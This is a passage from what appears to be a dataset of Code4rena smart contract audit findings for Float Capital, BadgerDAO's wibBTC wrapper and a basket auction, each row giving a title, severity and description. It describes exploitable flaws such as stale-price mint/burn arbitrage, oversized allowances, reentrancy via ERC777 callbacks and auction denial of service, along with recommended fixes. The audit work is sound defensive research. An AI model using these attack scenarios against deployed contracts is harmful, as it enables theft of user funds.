[`LongShort.sol` L532](https://github.com/hack3r-0m/2021-08-floatcapital/blob/main/contracts/contracts/LongShort.sol#L532)
```solidity
syntheticToken_priceSnapshot[marketIndex][isLong][currentMarketUpdateIndex]
```

This uses price of current x+2 th update while it should balance of accounting for price of x+1 th update."
22.md,Missing events/timelocks for owner/admin only functions that change critical parameters,medium,"Owner/admin only functions that change critical parameters should emit events and have timelocks. Events allow capturing the changed parameters so that off-chain tools/interfaces can register such changes with timelocks that allow users to evaluate them and consider if they would like to engage/exit based on how they perceive the changes as affecting the trustworthiness of the protocol or profitability of the implemented financial services. The alternative of directly querying on-chain contract state for such changes is not considered practical for most users/usages.

Missing events and timelocks do not promote transparency and if such changes immediately affect users’ perception of fairness or trustworthiness, they could exit the protocol causing a reduction in liquidity which could negatively impact protocol TVL and reputation.

There are owner/admin functions that do not emit any events in `LongShort.sol`. It is not apparent that any owner/admin functions will have timelocks.

See similar High-severity [H03](https://blog.openzeppelin.com/audius-contracts-audit/#high) finding in OpenZeppelin’s Audit of Audius and Medium-severity [M01](https://blog.openzeppelin.com/uma-audit-phase-4/) finding OpenZeppelin’s Audit of UMA Phase 4

See issue page for referenced code.

Recommend adding events to all owner/admin functions that change critical parameters. Add timelocks to introduce time delays for critical parameter changes that significantly impact market/user incentives/security."
22.md,Staker.sol: Wrong values returned in edge cases of `_calculateFloatPerSecond()`,medium,"In `_calculateFloatPerSecond()`, the edge cases where full rewards go to either the long or short token returns

`return (1e18 * k * longPrice, 0);` and

`return (0, 1e18 * k * shortPrice);` respectively.

This is however `1e18` times too large. We can verify this by checking the equivalent calculation in the 'normal case', where we assume all the rewards go to the short token, ie. `longRewardUnscaled = 0`  and `shortRewardUnscaled = 1e18`. Plugging this into the calculation below,

`return ((longRewardUnscaled * k * longPrice) / 1e18, (shortRewardUnscaled * k * shortPrice) / 1e18);` results in

`(0, 1e18 * k * shortPrice / 1e18)` or `(0, k * shortPrice)`.

As we can see, this would result in an extremely large float token issuance rate, which would be disastrous.

The edge cases should return `(k * longPrice, 0)` and `(0, k * shortPrice)` in the cases where rewards should go fully to long and short token holders respectively."
22.md,Wrong aave usage of `claimRewards`,medium,"Aave yield manager claims rewards with the payment token. According to aave's document, aToken should be provided.
The aave rewards would be unclaimable.

YieldManager's logic in [L161-L170](https://github.com/code-423n4/2021-08-floatcapital/blob/main/contracts/contracts/YieldManagerAave.sol#L161-L170)

Reference: https://docs.aave.com/developers/guides/liquidity-mining#claimrewards

Recommend changing to
```solidity
  address[] memory rewardsDepositedAssets = new address[](1);
  rewardsDepositedAssets[0] = address(aToken);
```"
22.md,Prevent markets getting stuck when prices don't move,medium,"Suppose there is a synthetic token where the price stays constant, for example:
- synthetic DAI  (with a payment token of DAI the price will not move)
- binary option token (for example tracking the USA elections; after the election results there will be no more price movements)

In that case `assetPriceHasChanged` will never be true (again) and `marketUpdateIndex[marketIndex]` will never increase.
This means the `_executeOutstandingNextPrice`* functions will never be executed, which means the market effectively will be stuck.

[`LongShort.sol` L669](https://github.com/code-423n4/2021-08-floatcapital/blob/main/contracts/contracts/LongShort.sol#L669)
```solidity
function `_updateSystemStateInternal`(uint32 marketIndex) internal virtual requireMarketExists(marketIndex) {
  ...
  int256 newAssetPrice = IOracleManager(oracleManagers[marketIndex]).updatePrice();
  int256 oldAssetPrice = int256(assetPrice[marketIndex]);
  bool assetPriceHasChanged = oldAssetPrice != newAssetPrice;

  if (assetPriceHasChanged || msg.sender == staker) {
    ....
    if (!assetPriceHasChanged) {
      return;
    }
    ....
    marketUpdateIndex[marketIndex] += 1;  // never reaches this point if the price doesn't change

// https://github.com/code-423n4/2021-08-floatcapital/blob/main/contracts/contracts/LongShort.sol#L1035
function _executeOutstandingNextPriceSettlements(address user, uint32 marketIndex) internal virtual {
  uint256 userCurrentUpdateIndex = userNextPrice_currentUpdateIndex[marketIndex][user];
  if (userCurrentUpdateIndex != 0 && userCurrentUpdateIndex <= marketUpdateIndex[marketIndex]) { // needs marketUpdateIndex[marketIndex] to be increased
    _executeOutstandingNextPriceMints(marketIndex, user, true);
    _executeOutstandingNextPriceMints(marketIndex, user, false);
    _executeOutstandingNextPriceRedeems(marketIndex, user, true);
    _executeOutstandingNextPriceRedeems(marketIndex, user, false);
    _executeOutstandingNextPriceTokenShifts(marketIndex, user, true);
    _executeOutstandingNextPriceTokenShifts(marketIndex, user, false);
```

Recommend enhancing `_updateSystemStateInternal` so that after a certain period of time without price movements (for example 1 day), the entire function is executed (including the `marketUpdateIndex[marketIndex]` += 1;)"
22.md,Missing input validation on many functions throughout the code,low,"Many functions throughout `LongShort.sol` and `YieldManager.sol` have no simple checks for validating inputs. Below some examples are linked. See `LongShort.sol` [L254](https://github.com/code-423n4/2021-08-floatcapital/blob/bd419abf68e775103df6e40d8f0e8d40156c2f81/contracts/contracts/LongShort.sol#L254), and `YieldManager.sol` [L149](https://github.com/code-423n4/2021-08-floatcapital/blob/bd419abf68e775103df6e40d8f0e8d40156c2f81/contracts/contracts/YieldManagerAave.sol#L149).


Recommend simple validations like requiring non-zero address or checking that amounts are non-zero would fix this."
22.md,Comment-code mismatch for `_balanceIncentiveCurve_exponent` threshold,low,"The code comment says: “// The exponent has to be less than 5 in these versions of the contracts.” but the code immediately after the comment implements a check “< 6.” It is unclear if the comment is incorrect or the check is wrong. An incorrect check may have mathematical implications. [Staker.sol L276-L277](https://github.com/code-423n4/2021-08-floatcapital/blob/bd419abf68e775103df6e40d8f0e8d40156c2f81/contracts/contracts/Staker.sol#L276-L277)

Recommend revisiting comment and code to sync them by fixing the comment or the code whichever is incorrect."
22.md,Use of floating pragma,low,"https://swcregistry.io/docs/SWC-103

` ILendingPool.sol` have floating pragma and its been used in `YieldManger.sol` [L9](https://github.com/code-423n4/2021-08-floatcapital/blob/bd419abf68e775103df6e40d8f0e8d40156c2f81/contracts/contracts/YieldManagerAave.sol#L9).

Recommend using fixed solidity version"
22.md,prevent reentrancy,low,"If the payment token would be an ERC777 token (or another token that has callbacks), then an reentrancy attack could be tried.
Especially in `function_executeOutstandingNextPriceSettlements` multiple transfers are called, which could call callbacks.
These callbacks could go to an attacker contract which could call functions of the `LongShort.sol` contract

Although I haven't found a scenario to misuse the reentrancy its better to prevent this.
`LongShort.sol` [#L1035](https://github.com/code-423n4/2021-08-floatcapital/blob/main/contracts/contracts/LongShort.sol#L1035)
```solidity
function _executeOutstandingNextPriceSettlements(address user, uint32 marketIndex) internal virtual {
    uint256 userCurrentUpdateIndex = userNextPrice_currentUpdateIndex[marketIndex][user];
    if (userCurrentUpdateIndex != 0 && userCurrentUpdateIndex <= marketUpdateIndex[marketIndex]) {
      _executeOutstandingNextPriceMints(marketIndex, user, true);        // transfers synth token to user
      _executeOutstandingNextPriceMints(marketIndex, user, false);       // transfers synth token to user
      _executeOutstandingNextPriceRedeems(marketIndex, user, true);  // transfers payment token to user
      _executeOutstandingNextPriceRedeems(marketIndex, user, false);  // transfers payment token to user
      _executeOutstandingNextPriceTokenShifts(marketIndex, user, true);
      _executeOutstandingNextPriceTokenShifts(marketIndex, user, false);

      userNextPrice_currentUpdateIndex[marketIndex][user] = 0;

      emit ExecuteNextPriceSettlementsUser(user, marketIndex);
    }
  }
```

Recommend preventing reentrancy attacks in one of the following ways:
- make sure the payment tokens don't have call back function / are not ERC777
- or add reentrancy guards to _executeOutstandingNextPriceSettlements (see [ReentrancyGuard.sol](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/security/ReentrancyGuard.sol))"
22.md,`PERMANENT_INITIAL_LIQUIDITY_HOLDER` not 100% safe,low,"The initial tokens are minted to the address `PERMANENT_INITIAL_LIQUIDITY_HOLDER`
The comments suggest they can never be moved from there.
However `transferFrom` in `SyntheticToken.sol` allows `longShort` to move tokens from any address so also from address `PERMANENT_INITIAL_LIQUIDITY_HOLDER`.

This is unlikely to happen because the current source of `LongShort.sol` doesn't allow for this action.
However `LongShort.sol` is upgradable to in theory a future version could allow this. [LongShort.sol L34](https://github.com/code-423n4/2021-08-floatcapital/blob/main/contracts/contracts/LongShort.sol#L34)
```solidity
/// @notice this is the address that permanently locked initial liquidity for markets is held by.
/// These tokens will never move so market can never have zero liquidity on a side.
/// @dev f10a7 spells float in hex - for fun - important part is that the private key for this address in not known.
address public constant PERMANENT_INITIAL_LIQUIDITY_HOLDER = 0xf10A7_F10A7_f10A7_F10a7_F10A7_f10a7_F10A7_f10a7;

//https://github.com/code-423n4/2021-08-floatcapital/blob/main/contracts/contracts/LongShort.sol#L304
function _seedMarketInitially(uint256 initialMarketSeedForEachMarketSide, uint32 marketIndex) internal
...
  ISyntheticToken(syntheticTokens[latestMarket][true]).mint(PERMANENT_INITIAL_LIQUIDITY_HOLDER,initialMarketSeedForEachMarketSide);
  ISyntheticToken(syntheticTokens[latestMarket][false]).mint(PERMANENT_INITIAL_LIQUIDITY_HOLDER, initialMarketSeedForEachMarketSide);
```

[`SyntheticToken.sol` L91](https://github.com/code-423n4/2021-08-floatcapital/blob/main/contracts/contracts/SyntheticToken.sol#L91)
```solidity
function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
  if (recipient == longShort && msg.sender == longShort) {   // sender could be any address
    super._transfer(sender, recipient, amount);
    return true;
  } else {
    return super.transferFrom(sender, recipient, amount);
  }
}
```
Recommend accepting the risk and document this in the contract. Or, update `transferFrom` to contain the following:
```solidity
if (recipient == longShort && msg.sender == longShort && sender!=PERMANENT_INITIAL_LIQUIDITY_HOLDER)
```"
22.md,Staker.sol: Updating `kValue` requires interpolation with initial timestamp,low,"Updating a `kValue` of a market requires interpolation against the initial timestamp, which can be a hassle and might lead to a wrong value set from what is expected.

Consider the following scenario:
- Initially set `kValue = 2e18`, `kPeriod = 2592000` (30 days)
- After 15 days, would like to refresh the market incentive (start again with `kValue = 2e18`), lasting another 30 days.

In the current implementation, the admin would call `_changeMarketLaunchIncentiveParameters()` with the following inputs:
- `period = 3888000` (45 days)
- `kValue` needs to be worked backwards from the formula

    `kInitialMultiplier - (((kInitialMultiplier - 1e18) * (block.timestamp - initialTimestamp)) / kPeriod)`. To achieve the desired effect, we would get `kValue = 25e17` (formula returns 2e18 after 15 days with kPeriod = 45 days).

This isn't immediately intuitive and could lead to mistakes.

Recommend that Instead of calculating from `initialTimestamp` (when `addNewStakingFund()` was called), calculate from when the market incentives were last updated. This would require a new mapping to store last updated timestamps of market incentives.

For example, using the scenario above, refreshing the market incentive would mean using inputs `period = 2592000` (30 days) with `kValue = 2e18`.

```jsx
// marketIndex => timestamp of updated market launch incentive params
mapping(uint32 => uint256) public marketLaunchIncentive_update_timestamps;

function _changeMarketLaunchIncentiveParameters(
  uint32 marketIndex,
  uint256 period,
  uint256 initialMultiplier
) internal virtual {
	require(initialMultiplier >= 1e18, ""marketLaunchIncentiveMultiplier must be >= 1e18"");

  marketLaunchIncentive_period[marketIndex] = period;
  marketLaunchIncentive_multipliers[marketIndex] = initialMultiplier;
	marketLaunchIncentive_update_timestamps[marketIndex] = block.timestamp;
};

function _getKValue(uint32 marketIndex) internal view virtual returns (uint256) {
  // Parameters controlling the float issuance multiplier.
  (uint256 kPeriod, uint256 kInitialMultiplier) = _getMarketLaunchIncentiveParameters(marketIndex);

  // Sanity check - under normal circumstances, the multipliers should
  // *never* be set to a value < 1e18, as there are guards against this.
  assert(kInitialMultiplier >= 1e18);

	// currently: uint256 initialTimestamp = accumulativeFloatPerSyntheticTokenSnapshots[marketIndex][0].timestamp;
	// changed to take from last updated timestamp instead of initial timestamp
  uint256 initialTimestamp = marketLaunchIncentive_update_timestamps[marketIndex];

  if (block.timestamp - initialTimestamp <= kPeriod) {
    return kInitialMultiplier - (((kInitialMultiplier - 1e18) * (block.timestamp - initialTimestamp)) / kPeriod);
  } else {
    return 1e18;
  }
}
```"
22.md,TokenFactory.sol: DEFAULT_ADMIN_ROLE has wrong value,low,"`TokenFactory.sol` defines `DEFAULT_ADMIN_ROLE = keccak256(""DEFAULT_ADMIN_ROLE"");`, but OpenZeppelin's `AccessControl.sol` defines `DEFAULT_ADMIN_ROLE = 0x00`, so that by default, all other roles defined will have their admin role to be `DEFAULT_ADMIN_ROLE`.

This makes the following lines erroneous:

```jsx
// Give minter roles
SyntheticToken(syntheticToken).grantRole(DEFAULT_ADMIN_ROLE, longShort);
SyntheticToken(syntheticToken).grantRole(MINTER_ROLE, longShort);
SyntheticToken(syntheticToken).grantRole(PAUSER_ROLE, longShort);

// Revoke roles
SyntheticToken(syntheticToken).revokeRole(DEFAULT_ADMIN_ROLE, address(this));
SyntheticToken(syntheticToken).revokeRole(MINTER_ROLE, address(this));
SyntheticToken(syntheticToken).revokeRole(PAUSER_ROLE, address(this));
```

Due to how `grantRole()` and `revokeRole()` works, the lines above will not revert. However, note that `TokenFactory` will have `DEFAULT_ADMIN_ROLE (0x00)` instead of `LongShort`. This by itself doesn't seem to have any adverse effects, since `TokenFactory` doesn't do anything else apart from creating new synthetic tokens.

Nonetheless, I believe that `DEFAULT_ADMIN_ROLE` was unintentionally defined as `keccak256(""DEFAULT_ADMIN_ROLE"")`, and should be amended.

The revoking role order will also have to be swapped so that `DEFAULT_ADMIN_ROLE` is revoked last.

```jsx
bytes32 public constant DEFAULT_ADMIN_ROLE = 0x00;

function createSyntheticToken(
  string calldata syntheticName,
  string calldata syntheticSymbol,
  address staker,
  uint32 marketIndex,
  bool isLong
) external override onlyLongShort returns (ISyntheticToken syntheticToken) {
	...
  // Revoke roles
  _syntheticToken.revokeRole(MINTER_ROLE, address(this));
  _syntheticToken.revokeRole(PAUSER_ROLE, address(this));
	_syntheticToken.revokeRole(DEFAULT_ADMIN_ROLE, address(this));
}
```"
22.md,`YieldManagerAave.sol`: Wrong branch in `depositPaymentToken()` if `amountReservedInCaseOfInsufficientAaveLiquidity` == amount,low,"In the unlikely event `amountReservedInCaseOfInsufficientAaveLiquidity == amount`, the `else` case will be executed, which means `lendingPool.deposit()` is called with a value of zero. It would therefore be better to change the condition so that the `if` case is executed instead.

```jsx
function depositPaymentToken(uint256 amount) external override longShortOnly {
  // If amountReservedInCaseOfInsufficientAaveLiquidity isn't zero, then efficiently net the difference between the amount
  // It basically always be zero besides extreme and unlikely situations with aave.
  if (amountReservedInCaseOfInsufficientAaveLiquidity != 0) {
		// instead of strictly greater than
    if (amountReservedInCaseOfInsufficientAaveLiquidity >= amount) {
      amountReservedInCaseOfInsufficientAaveLiquidity -= amount;
      // Return early, nothing to deposit into the lending pool
      return;
    }
	...
}
```"
22.md,`LongShort` should not shares the same Yield Manager between different markets,low,"`LongShort` should not shares the same Yield Manager between different markets
The `LongShort` contract would not stop different markets from using the same yield manager contracts. Any extra aToken in the yield manager would be considered as market incentives in function `distributeYieldForTreasuryAndReturnMarketAllocation`. Thus, using the same yield manager for different markets would break the markets and allow users to withdraw fund that doesn't belong to them. [`YieldManagerAave.sol` L179-L204](https://github.com/code-423n4/2021-08-floatcapital/blob/main/contracts/contracts/YieldManagerAave.sol#L179-L204)

Given the fluency of programming skills the dev shows, I believe they wouldn't make this mistake on deployment. Still, I think there's space to improve in the YieldManagerAave contract. IMHO. As it's tightly coupled with `longshort` contract and its market logic, a initialize market function in the yield manager seems more reasonable."
22.md,The address of Aave `lendingPool` may change,low,"Contract `YieldManagerAave` caches `lendingPool`, however, in theory, it is possible that the implementation may change (see [L58-L65](https://github.com/aave/aave-protocol/blob/4b4545fb583fd4f400507b10f3c3114f45b8a037/contracts/configuration/LendingPoolAddressesProvider.sol#L58-L65) of Aave's  `LendingPoolAddressesProvider.sol`). I am not sure how likely in practice is that but a common solution that I see in other protocols that integrate with Aave is querying the `lendingPool` on the go (of course then you also need to handle the change in approvals).

An example solution you can see [here](https://github.com/code-423n4/2021-07-sherlock/blob/d9c610d2c3e98a412164160a787566818debeae4/contracts/strategies/AaveV2.sol#L63-L65)."
22.md,confusing comments,low,"I've seen comments which are confusing:
`~10^31 or 10 Trillion (10^13)` ==> probably should be 2^31
`x * 5e17 == `(x * 10e18) / 2`   ==> probably should be 1e18/2

// https://github.com/code-423n4/2021-08-floatcapital/blob/main/contracts/contracts/Staker.sol#L19
// 2^52 ~= 4.5e15
  // With an exponent of 5, the largest total liquidity possible in a market (to avoid integer overflow on exponentiation) is ~10^31 or 10 Trillion (10^13)

//https://github.com/code-423n4/2021-08-floatcapital/blob/main/contracts/contracts/Staker.sol#L480
      // NOTE: `x * 5e17` == `(x * 10e18) / 2`

Recommend double checking the comments."
22.md,Docstring,low,A lot of docstrings for `marketIndex` are @param marketIndex An int32 which uniquely identifies a market. but it is a `uint32` not an `int32`
22.md,Possibly not all synths can be withdrawn,low,"The `LongShort._handleTotalPaymentTokenValueChangeForMarketWithYieldManager` function assumes that the `YieldManager` indeed withdraws all of the desired payment tokens, but it could be that they are currently lent out at Aave.

```solidity
// NB there will be issues here if not enough liquidity exists to withdraw
// Boolean should be returned from yield manager and think how to appropriately handle this
IYieldManager(yieldManagers[marketIndex]).removePaymentTokenFromMarket(
  uint256(-totalPaymentTokenValueChangeForMarket)
);
```

Recommend trying to withdraw these tokens will then fail.
> Boolean should be returned from yield manager and think how to appropriately handle this 😁"
22.md,Protocol requires a running bot in order to make sure trades are actually executed,low,"Because smart contracts need to be poked to execute, trades placed before an oracle update won't be executed until someone else calls the function to execute queued trades. This means that a bot must run to constantly execute trades after every oracle update.

If such a bot was not running, users would have an incentive to only execute their trades after a favorable oracle update. However, having a dedicated bot run by the team centralizes the project with a single failure point. The typical solution here is to create keeper incentives for the protocol.

Recommend either making sure the team has a bot running or preferably create incentives for other users to constantly keep the queued orders executing."
22.md,Race-condition risk with initialize functions,low,"Race-condition risk with initialize functions if deployment script is not robust to create and initialize contracts atomically or if factory contracts do not create and initialize appropriately.

If this is not implemented correctly, an attacker can front-run to initialize contracts with their parameters. This, if noticed, will require a redeployment of contracts resulting in potential DoS and  reputational damage. See [Short.sol L188-L193](https://github.com/code-423n4/2021-08-floatcapital/blob/bd419abf68e775103df6e40d8f0e8d40156c2f81/contracts/contracts/LongShort.sol#L188-L193), [FloatToken.sol L21-L25](https://github.com/code-423n4/2021-08-floatcapital/blob/bd419abf68e775103df6e40d8f0e8d40156c2f81/contracts/contracts/FloatToken.sol#L21-L25), and [Staker.sol L179-L186](https://github.com/code-423n4/2021-08-floatcapital/blob/bd419abf68e775103df6e40d8f0e8d40156c2f81/contracts/contracts/Staker.sol#L179-L186).

Recommend ensuring deployment script is robust to create and initialize contracts atomically or factory contracts create and initialize appropriately."
47.md,The design of `wibBTC` is not fully compatible with the current Curve StableSwap pool,high,"Per the documentation, `wibBTC` is designed for a Curve StableSwap pool. However, the design of `wibBTC` makes the balances change dynamically and automatically. This is unusual for an ERC20 token, and it's not fully compatible with the current Curve StableSwap pool.

Specifically, a Curve StableSwap pool will maintain the balances of its `coins` based on the amount of tokens added, removed, and exchanged each time. In another word, it can not adopt the dynamic changes of the balances that happened automatically.

The pool's actual dynamic balance of `wibBTC` will deviate from the recorded balance in the pool contract as the `pricePerShare` increases.

Furthermore, there is no such way in Curve StableSwap similar to the `sync()` function of UNI v2, which will force sync the stored `reserves` to match the balances.

##### PoC
Given:

*   The current `pricePerShare` is: `1`;
*   The Curve pool is newly created with 0 liquidity;

1.  Alice added `100 wibBTC` and `100 wBTC` to the Curve pool; Alice holds 100% of the pool;
2.  After 1 month with no activity (no other users, no trading), and the `pricePerShare` of `ibBTC` increases to `1.2`;
3.  Alice removes all the liquidity from the Curve pool.

While it's expected to receive `150 wibBTC` and `100 wBTC`, Alice actually can only receive `100 wibBTC` and `100 wBTC`.

#### Recommended Mitigation Steps
Consider creating a revised version of the Curve StableSwap contract that can handle dynamic balances properly."
47.md,Approved spender can spend too many tokens,high,"The `approve` function has not been overridden and therefore uses the internal *shares*, whereas `transfer(From)` uses the rebalanced amount.

#### Impact
The approved spender may spend more tokens than desired. In fact, the approved amount that can be transferred keeps growing with `pricePerShare`.

Many contracts also use the same amount for the `approve` call as for the amount they want to have transferred in a subsequent `transferFrom` call, and in this case, they approve an amount that is too large (as the approved `shares` amount yields a higher rebalanced amount).

#### Recommended Mitigation Steps

The `_allowances` field should track the rebalanced amounts such that the approval value does not grow. (This does not actually require overriding the `approve` function.)
In `transferFrom`, the approvals should then be subtracted by the *transferred* `amount`, not the `amountInShares`:

```solidity
// _allowances are in rebalanced amounts such that they don't grow
// need to subtract the transferred amount
_approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, ""ERC20: transfer amount exceeds allowance""));
```"
47.md,`WrappedIbbtcEth` contract will use stalled price for mint/burn if `updatePricePerShare` wasn't run properly,high,"#### Impact

Malicious user can monitor `SetPricePerShare` event and, if it was run long enough time ago and market moved, but, since there were no `SetPricePerShare` fired, the contract's `pricePerShare` is outdated, so a user can `mint()` with `pricePerShare` that is current for contract, but outdated for market, then wait for price update and `burn()` with updated `pricePerShare`, yielding risk-free profit at expense of contract holdings.

#### Proof of Concept

`WrappedIbbtcEth` updates `pricePerShare` variable by externally run `updatePricePerShare` function. The variable is then used in mint/burn/transfer functions without any additional checks, even if outdated/stalled. This can happen if the external function wasn't run for any reason.
The variable is used via `balanceToShares` function: [`WrappedIbbtcEth.sol` L155](https://github.com/code-423n4/2021-10-badgerdao/blob/main/contracts/WrappedIbbtcEth.sol#L155)


This is feasible as `updatePricePerShare` to be run by off-chain script being a part of the system, and malfunction of this script leads to contract exposure by stalling the price. The malfunction can happen both by internal reasons (bugs) and by external ones (any system-level dependencies, network outrages).
`updatePricePerShare` function: [`WrappedIbbtcEth.sol` L72](https://github.com/code-423n4/2021-10-badgerdao/blob/main/contracts/WrappedIbbtcEth.sol#L72)

#### Recommended Mitigation Steps
The risk comes with system design. Wrapping price updates with contract level variable for gas costs minimization is a viable approach, but it needs to be paired with corner cases handling. One of the ways to reduce the risk is as follows:

Introduce a threshold variable for maximum time elapsed since last `pricePerShare` update to `WrappedIbbtcEth` contract.

Then 2 variants of `transferFrom` and `transfer` functions can be introduced, both check condition {now - time since last price update < threshold}. If condition holds both variants, do the transfer. If it doesn't, then the first variant reverts, while the second do costly price update.
I.e. it will be cheap transfer (that works only if price is recent) and full transfer (that is similar to the first when price is recent, but do price update on its own when price is stalled). This way, this full transfer is guaranteed to run and is usually cheap, costing more if price is stalled and it does the update.

After this, whenever scheduled price update malfunctions (for example because of network conditions), the risk will be limited by market volatility during threshold time at maximum, i.e. capped.

See [issue page](https://github.com/code-423n4/2021-10-badgerdao-findings/issues/86) for example code:"
47.md,`WrappedIbbtc` and `WrappedIbbtcEth` contracts do not filter out price feed outliers,high,"#### Impact
If price feed is manipulated in any way or there is any malfunction based volatility on the market, both contracts will pass it on a user.
In the same time it's possible to construct mitigation mechanics for such cases, so user economics would be affected by sustainable price movements only.
As price outrages provide a substantial attack surface for the project it's worth adding some complexity to the implementation.

#### Proof of Concept
In `WrappedIbbtcEth` `pricePerShare` variable is updated by externally run `updatePricePerShare` function ([WrappedIbbtcEth.sol L72](https://github.com/code-423n4/2021-10-badgerdao/blob/main/contracts/WrappedIbbtcEth.sol#L72)), and then used in mint/burn/transfer functions without additional checks via `balanceToShares` function: [`WrappedIbbtcEth.sol` L155](https://github.com/code-423n4/2021-10-badgerdao/blob/main/contracts/WrappedIbbtcEth.sol#L155)

In `WrappedIbbtc` price is requested via `pricePerShare` function([`WrappedIbbtc.sol` L123](https://github.com/code-423n4/2021-10-badgerdao/blob/main/contracts/WrappedIbbtc.sol#L123)), and used in the same way without additional checks via `balanceToShares` [function](https://github.com/code-423n4/2021-10-badgerdao/blob/main/contracts/WrappedIbbtc.sol#L147).

#### Recommended Mitigation Steps
Introduce a minting/burning query that runs on a schedule, separating user funds contribution and actual mint/burn. With user deposit or burn, the corresponding action to be added to commitment query, which execution for mint or redeem will later be sparked by off-chain script according to fixed schedule.
This also can be open to public execution with gas compensation incentive, for example as it's done in Tracer protocol: [`PoolKeeper.sol` L131](https://github.com/tracer-protocol/perpetual-pools-contracts/blob/develop/contracts/implementation/PoolKeeper.sol#L131)

Full code of an implementation is too big to include in the report, but viable versions are available publicly (Tracer protocol version can be found at the same repo, [`implementation/PoolCommitter` sol](https://github.com/tracer-protocol/perpetual-pools-contracts/blob/develop/contracts/implementation/PoolCommitter.sol)
).

Once the scheduled mint/redeem query is added, the additional logic to control for price outliers will become possible there, as in this case mint/redeem execution can be conditioned to happen on calm market only, where various definitions of calm can be implemented.
One of the approaches is to keep track of recent prices and require that new price each time be within a threshold from median of their array.

Example:
```solidity
// Introduce small price tracking arrays:
uint256\[] private times;
uint256\[] private prices;

// Current position in array
uint8 curPos;

// Current length, grows from 0 to totalMaxPos as prices are being added
uint8 curMaxPos;

// Maximum length, we track up to totalMaxPos prices
uint8 totalMaxPos = 10;

// Price movement threshold
uint256 moveThreshold = 0.1\*1e18;
```

We omit the full implementation here as it is lengthy enough and can vary.
The key steps are:
*   Run query for scheduled mint/redeem with logic: if next price is greater than median of currently recorded prices by threshold, add it to the records, but do not mint/redeem.
*   That is, when scheduled mint/redeem is run, on new price request, WrappedIbbtcEth.core.pricePerShare() or WrappedIbbtc.oracle.pricePerShare(), get newPrice and calculate current price array median, curMed
*   prices\[curPos] = newPrice
*   if (curMaxPos < totalMaxPos) {curMaxPos += 1}
*   if (curPos == curMaxPos) {curPos = 0} else {curPos += 1}
*   if (absolute_value_of(newPrice - curMed) < moveThreshold \* curMed / 1e18) {do_mint/redeem; return\_0\_status}
*   else {return\_1\_status}

Schedule should be frequent enough, say once per 30 minutes, which is kept while returned status is 0. While threshold condition isn't met and returned status is 1, it runs once per 10 minutes. The parameters here are subject to calibration.

This way if the price movement is sustained the mint/redeem happens after price array median comes to a new equilibrium. If price reverts, the outbreak will not have material effect mint/burn operations. This way the contract vulnerability is considerably reduced as attacker would need to keep distorted price for period long enough, which will happen after the first part of deposit/withdraw cycle. I.e. deposit and mint, burn and redeem operations will happen not simultaneously, preventing flash loans to be used to elevate the quantities, and for price to be effectively distorted it would be needed to keep it so for substantial amount of time."
47.md,Unable to transfer `WrappedIbbtc` if Oracle go down,medium,"#### Impact
In `WrappedIbbtc`, user will not be able to transfer if `oracle.pricePerShare()` (L124) revert. This is because `balanceToShares()` is called in both transfer and `transferFrom`, which included a call to `pricePerShare()`.

If this is the expected behavior, note that `WrappedIbbtcEth` is behaving the opposite as it uses the cached value in a local variable `pricePerShare`, which is only updated upon call to `updatePricePerShare()`.

#### Recommended Mitigation Steps
Depending on the specification, one of them need to be changed."
47.md,Null check in `pricePerShare`,medium,"oracle can `0` as a price of the share, in that case, 0 will be the denominator in some calculations which can cause reverts from SafeMath (for e.g here: [`WrappedIbbtc.sol` L148](https://github.com/code-423n4/2021-10-badgerdao/blob/main/contracts/WrappedIbbtc.sol#L148)) resulting in Denial Of Service.

- [`WrappedIbbtcEth.sol` L73](https://github.com/code-423n4/2021-10-badgerdao/blob/main/contracts/WrappedIbbtcEth.sol#L73)
- [`WrappedIbbtc.sol` L123](https://github.com/code-423n4/2021-10-badgerdao/blob/main/contracts/WrappedIbbtc.sol#L123)


#### Recommended Mitigation Steps
Add a null check to ensure that on every update, the price is greater than 0."
47.md,hard to clear balance,medium,"The contract does not allow users to transfer by share. Therefore, It is hard for users to clear out all the shares.
There will be users using this token with Metamask and it is likely the `pricePerShare` would increase after the user sends transactions. I consider this is a medium-risk issue.

#### Proof of Concept
[WrappedIbbtc.sol#L110-L118](https://github.com/code-423n4/2021-10-badgerdao/blob/main/contracts/WrappedIbbtc.sol#L110-L118)

#### Recommended Mitigation Steps
A new `transferShares` beside the original `transfer()` would build a better UX. sushi's bento box would be a good ref [BentoBox.sol](https://github.com/sushiswap/bentobox/blob/master/contracts/BentoBox.sol)"
47.md,No sanity check on `pricePerShare` might lead to lost value,medium,"`pricePerShare` is read either from an oracle or from ibBTC's core.

If one of these is bugged or exploited, there are no safety checks to prevent loss of funds.

#### Impact
As `pricePerShare` is used to calculate transfer amount, a bug or wrong data retuning a smaller `pricePerShare` than it really is, could result in drainage of wibbtc from Curve pool.

#### Proof of Concept
Curve's swap and remove liquidity functions will both call wibbtc's `transfer` function:
- https://etherscan.io/address/0xFbdCA68601f835b27790D98bbb8eC7f05FDEaA9B#code%23L790
- https://etherscan.io/address/0xFbdCA68601f835b27790D98bbb8eC7f05FDEaA9B#code%23L831
- The `transfer` function calculates the amount to send by calling `balanceToShares`: [`WrappedIbbtcEth.sol` L127](https://github.com/code-423n4/2021-10-badgerdao/blob/main/contracts/WrappedIbbtcEth.sol#L127)
- `balanceToShares` calculates the shares (=amount to send) by dividing in `pricePerShare`: [`WrappedIbbtcEth.sol` L156](https://github.com/code-423n4/2021-10-badgerdao/blob/main/contracts/WrappedIbbtcEth.sol#L156)

Therefore, if due to a bug or exploit in ibBTC core / the trusted oracle `pricePerShare` is smaller than it really is, the amount that will be sent will grow larger. So Curve will send to the user/exploiter doing swap/remove liquidity more tokens that he deserves.

#### Tools Used
Manual analysis, hardhat

#### Recommended Mitigation Steps
Add sanity check:

`pricePerShare` should never decrease but only increase with time (as ibbtc accrues interest) (validated with DefiDollar team). This means that on every `pricePerShare` read/update, if the new `pricePerShare` is smaller than the current one, we can discard the update as bad data.

This will prevent an exploiter from draining Curve pool's wibbtc reserves by decreasing `pricePerShare`."
41.md,Bonding mechanism allows malicious user to DOS auctions,high,".

A malicious user can listen to the mempool and immediately bond when an auction starts, without aim of settling the auction. As no one can cancel his bond in less than 24h, this will freeze user funds and auction settlement for 24h until his bond is burned and the new index is deleted. The malicious user can then repeat this when a new auction starts.

While the malicious user will have to pay by having his bond burned, it might not be enough of a detriment for the DOS of the basket.

#### Impact

Denial of service of the auction mechanism. The malicious user can hold the basket ""hostage"" and postpone or prevent implementing new index.
